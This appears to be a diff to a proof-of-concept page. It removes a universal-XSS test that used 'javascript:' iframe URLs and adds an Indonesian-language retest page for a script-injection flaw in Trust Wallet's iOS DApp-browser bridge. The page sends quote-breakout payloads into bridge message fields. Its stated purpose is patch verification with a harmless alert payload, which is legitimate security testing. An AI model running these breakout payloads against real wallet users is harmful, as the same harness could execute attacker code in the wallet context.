@@ -1,10 +1,107 @@
-<script>
-window.onblur = function () {
-  var f = document.getElementById("iframe");
-  // Uji tiap varian satu per satu:
-  f.src = "JavaScript:prompt('UXSS PoC: executed in host context','')";        // case
-  // f.src = "java\tscript:prompt('UXSS PoC','')";                              // whitespace
-  // f.src = "data:text/html,<script>prompt('UXSS PoC','')<\/script>";          // data:
-  // location = "javascript:prompt('UXSS PoC','')";                            // top-frame
-};
-</script>
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Trust Wallet bridge injection — retest (payload jinak)</title>
+  <style>
+    body { font-family: -apple-system, system-ui, sans-serif; margin: 16px; line-height: 1.4; }
+    h1 { font-size: 18px; }
+    button { font-size: 16px; padding: 10px 16px; margin: 6px 0; }
+    #log { white-space: pre-wrap; background: #111; color: #0f0; padding: 12px;
+           border-radius: 8px; font-family: ui-monospace, Menlo, monospace; font-size: 13px; }
+    .note { color: #555; font-size: 13px; }
+  </style>
+</head>
+<body>
+  <h1>Bridge injection retest — payload jinak</h1>
+  <p class="note">
+    Hanya untuk verifikasi patch di perangkat/akun Anda sendiri. Payload cuma
+    <code>alert(document.domain)</code>. Tidak ada connect wallet, tidak ada sign,
+    tidak ada transfer aset. Jika sebuah <code>alert</code> muncul, breakout untuk
+    varian itu MASIH ada.
+  </p>
+
+  <button id="run">Jalankan semua varian</button>
+  <pre id="log">Menunggu…</pre>
+
+  <script>
+    'use strict';
+
+    const log = document.querySelector('#log');
+    const runBtn = document.querySelector('#run');
+    const lines = [];
+    function put(s) { lines.push(s); log.textContent = lines.join('\n'); }
+
+    // Payload jinak: hanya buktikan konteks eksekusi. Tanpa provider/sign.
+    const PAYLOAD = "alert(document.domain)";
+
+    // Beragam penutup string (breakout) untuk melawan escaping berbasis satu-quote.
+    // Masing-masing mencoba menutup string yang dibangun native lalu menyisipkan PAYLOAD
+    // lalu mengomentari sisa baris.
+    const breakouts = [
+      { closer: '");',  desc: 'double-quote + )'       , make: () => `zz_");${PAYLOAD}//` },
+      { closer: "');",  desc: 'single-quote + )'       , make: () => `zz_');${PAYLOAD}//` },
+      { closer: '`);',  desc: 'backtick + )'           , make: () => 'zz_`);' + PAYLOAD + '//' },
+      { closer: '\\',   desc: 'trailing backslash'     , make: () => `zz_\\";${PAYLOAD}//` },
+      { closer: '\\u',  desc: 'unicode-escaped quote'  , make: () => `zz_\\u0022);${PAYLOAD}//` }
+    ];
+
+    // Field yang mungkin ikut di-concat ke JS yang di-eval native.
+    function buildMessages(payloadStr, baseId) {
+      return [
+        { where: 'method',  obj: { method: payloadStr,     params: [],            jsonrpc: '2.0' } },
+        { where: 'params',  obj: { method: 'eth_chainId',  params: [payloadStr],  jsonrpc: '2.0' } },
+        { where: 'network', obj: { method: 'eth_chainId',  params: [],            jsonrpc: '2.0' }, network: payloadStr },
+        { where: 'name',    obj: { method: 'eth_chainId',  params: [],            jsonrpc: '2.0' }, name: payloadStr }
+      ].map((m, k) => ({
+        id: baseId + k,
+        network: m.network ?? 'ethereum',
+        name: m.name ?? 'rpcCall',
+        object: m.obj,
+        where: m.where
+      }));
+    }
+
+    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+    runBtn.addEventListener('click', async () => {
+      lines.length = 0;
+      const bridge = window.webkit?.messageHandlers?._tw_;
+      if (!bridge || typeof bridge.postMessage !== 'function' ||
+          !window.trustwallet?.ethereum) {
+        put('Buka halaman ini di DApp browser Trust Wallet iOS (build yang sudah dipatch).');
+        return;
+      }
+
+      put('Mulai retest. Amati apakah ada dialog alert yang muncul.');
+      put('Jika TIDAK ada alert sama sekali → patch menutup semua varian ini.\n');
+
+      let baseId = Math.trunc(Date.now() % 9000000000000000);
+
+      for (const b of breakouts) {
+        const payloadStr = b.make();
+        const msgs = buildMessages(payloadStr, baseId);
+        put(`— Breakout: ${b.desc}  [${b.closer}]`);
+        for (const msg of msgs) {
+          try {
+            bridge.postMessage(msg);
+            put(`    field=${msg.where}: terkirim (id ${msg.id})`);
+          } catch (e) {
+            put(`    field=${msg.where}: bridge menolak → ${String(e)}`);
+          }
+          await sleep(150); // beri jeda agar tiap eval terisolasi
+        }
+        baseId += 100;
+        put('');
+      }
+
+      put('Selesai. Ringkasan:');
+      put('  • Muncul alert pada suatu varian  → breakout MASIH ada di field/closer itu (laporkan).');
+      put('  • Tidak ada alert pada semua varian → kelas injeksi ini kemungkinan sudah tuntas.');
+      put('\nCatatan: fix yang benar = native berhenti membangun JS via string-concat');
+      put('(pakai JSON.stringify/parse atau evaluateJavaScript dengan nilai ter-serialize).');
+    }, { once: false });
+  </script>
+</body>
+</html>
